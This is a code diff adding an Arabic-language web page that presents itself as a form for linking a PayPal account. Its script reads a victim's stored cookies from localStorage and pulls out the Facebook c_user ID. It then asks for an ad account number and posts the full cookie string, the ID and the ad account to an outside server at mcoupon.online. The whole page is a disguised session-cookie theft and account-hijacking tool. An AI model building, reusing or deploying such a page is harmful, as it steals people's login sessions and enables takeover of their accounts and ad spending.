@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ربط حساب PayPal</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f4f4f9;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            width: 300px;
+            margin: auto;
+            margin-top: 50px;
+        }
+        input, button {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+        }
+        button {
+            background-color: #007bff;
+            color: white;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h3>ربط حساب PayPal</h3>
+        <label>معرف الحساب:</label>
+        <input type="text" id="account_id" readonly>
+
+        <label>رقم الحساب الإعلاني:</label>
+        <input type="text" id="ad_account">
+
+        <label>الكوكيز:</label>
+        <input type="text" id="cookies" readonly>
+
+        <button onclick="linkAccount()">ربط الحساب</button>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            let storedCookies = localStorage.getItem("userCookies");
+            document.getElementById("cookies").value = storedCookies || "لم يتم العثور على الكوكيز";
+
+            let cUserMatch = storedCookies.match(/c_user=(\\d+)/);
+            document.getElementById("account_id").value = cUserMatch ? cUserMatch[1] : "غير معروف";
+        });
+
+        function linkAccount() {
+            let adAccount = document.getElementById("ad_account").value.trim();
+            let cUser = document.getElementById("account_id").value;
+            let cookies = document.getElementById("cookies").value;
+
+            if (!adAccount) {
+                alert("يرجى إدخال رقم الحساب الإعلاني!");
+                return;
+            }
+
+            fetch("https://mcoupon.online/paypal/fppaypal/second1.php", {
+                method: "POST",
+                headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                body: `c_user=${encodeURIComponent(cUser)}&adaccount=${encodeURIComponent(adAccount)}&cookie=${encodeURIComponent(cookies)}`
+            })
+            .then(response => response.text())
+            .then(data => {
+                console.log("Response from server:", data);
+                window.location.href = "done.html";
+            })
+            .catch(error => {
+                console.error("❌ خطأ أثناء الإرسال:", error);
+                alert("❌ حدث خطأ أثناء الإرسال.");
+            });
+        }
+    </script>
+</body>
+</html>
